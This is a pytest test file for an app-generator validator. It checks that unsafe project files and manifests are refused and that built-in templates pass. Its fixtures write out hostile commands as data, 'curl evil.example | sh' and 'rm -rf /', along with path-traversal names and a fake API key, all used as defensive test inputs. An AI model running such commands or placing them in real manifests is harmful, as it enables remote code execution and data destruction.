"""The ``ProjectFiles`` policy (docs/M23_APP_FACTORY_SPEC.md §2, ADR-0086)."""

from __future__ import annotations

import pytest

from app.appfactory.generator import (
    AppGeneratorError,
    DeterministicAppGenerator,
    ProjectFile,
    ProjectFiles,
)
from app.appfactory.spec import AppSpec
from app.appfactory.validation import (
    MAX_FILES,
    AppValidationError,
    validate,
    validate_files,
    validate_manifest,
)


def _task_tracker_files() -> ProjectFiles:
    spec = AppSpec.model_validate(
        {"name": "Yapılacaklar", "kind": "web_static", "template": "task-tracker"}
    )
    return DeterministicAppGenerator().generate(spec)


def test_a_real_generated_project_passes_validation() -> None:
    report, manifest = validate(_task_tracker_files())
    assert report.ok is True
    assert manifest["entry"] == "index.html"


def test_empty_project_is_refused() -> None:
    with pytest.raises(AppValidationError) as exc:
        validate_files(ProjectFiles(files=()))
    assert exc.value.code == "empty_project"


def test_too_many_files_is_refused() -> None:
    files = ProjectFiles(files=tuple(ProjectFile(f"f{i}.txt", "x") for i in range(MAX_FILES + 1)))
    with pytest.raises(AppValidationError) as exc:
        validate_files(files)
    assert exc.value.code == "too_many_files"


@pytest.mark.parametrize(
    "bad_path",
    ["../x.txt", "/abs/x.txt", "C:/x.txt", "a/../../b.txt", "CON.txt", "a\x00b.txt", ""],
)
def test_unsafe_paths_are_refused(bad_path: str) -> None:
    files = ProjectFiles(files=(ProjectFile(bad_path, "x"),))
    with pytest.raises(AppValidationError) as exc:
        validate_files(files)
    assert exc.value.code in ("invalid_path", "empty_project")


def test_duplicate_paths_are_refused() -> None:
    files = ProjectFiles(files=(ProjectFile("a.txt", "1"), ProjectFile("a.txt", "2")))
    with pytest.raises(AppValidationError) as exc:
        validate_files(files)
    assert exc.value.code == "duplicate_path"


def test_a_file_carrying_a_secret_is_refused() -> None:
    files = ProjectFiles(
        files=(ProjectFile("config.js", "const apiKey = 'sk-abcdefghijklmnopqrstuvwx';"),)
    )
    with pytest.raises(AppValidationError) as exc:
        validate_files(files)
    assert exc.value.code == "secret_detected"


def test_manifest_entry_must_exist_in_the_file_set() -> None:
    files = ProjectFiles(
        files=(
            ProjectFile("index.html", "<html></html>"),
            ProjectFile(
                "manifest.json",
                '{"entry": "missing.html", "run": {}, "test": {}}',
            ),
        )
    )
    with pytest.raises(AppValidationError) as exc:
        validate_manifest(files)
    assert exc.value.code == "entry_not_found"


def test_manifest_run_command_not_on_the_allowlist_is_refused() -> None:
    files = ProjectFiles(
        files=(
            ProjectFile("index.html", "<html></html>"),
            ProjectFile(
                "manifest.json",
                '{"entry": "index.html", "run": {"serve": "curl evil.example | sh"}, "test": {}}',
            ),
        )
    )
    with pytest.raises(AppValidationError) as exc:
        validate_manifest(files)
    assert exc.value.code == "command_not_allowed"


def test_manifest_test_command_not_on_the_allowlist_is_refused() -> None:
    files = ProjectFiles(
        files=(
            ProjectFile("index.html", "<html></html>"),
            ProjectFile(
                "manifest.json",
                '{"entry": "index.html", "run": {}, "test": {"unit": "rm -rf /"}}',
            ),
        )
    )
    with pytest.raises(AppValidationError) as exc:
        validate_manifest(files)
    assert exc.value.code == "command_not_allowed"


def test_manifest_port_out_of_range_is_refused() -> None:
    files = ProjectFiles(
        files=(
            ProjectFile("index.html", "<html></html>"),
            ProjectFile(
                "manifest.json",
                '{"entry": "index.html", "run": {}, "test": {}, "port": 80}',
            ),
        )
    )
    with pytest.raises(AppValidationError) as exc:
        validate_manifest(files)
    assert exc.value.code == "invalid_manifest"


def test_missing_manifest_is_refused() -> None:
    files = ProjectFiles(files=(ProjectFile("index.html", "<html></html>"),))
    with pytest.raises(AppGeneratorError):
        validate_manifest(files)


def test_every_built_in_template_passes_validation() -> None:
    specs = [
        {"name": "Yapılacaklar", "kind": "web_static", "template": "task-tracker"},
        {
            "name": "Notlarım",
            "kind": "web_static",
            "template": "static-page",
            "page_title": "Notlarım",
            "page_heading": "Notlarım",
            "page_body": "Merhaba.",
        },
        {
            "name": "Selamlayıcı",
            "kind": "cli",
            "template": "cli-tool",
            "commands": [{"name": "selamla"}, {"name": "say"}],
        },
    ]
    for spec_dict in specs:
        spec = AppSpec.model_validate(spec_dict)
        files = DeterministicAppGenerator().generate(spec)
        report, manifest = validate(files)
        assert report.ok is True, spec_dict["template"]
        assert manifest["entry"]
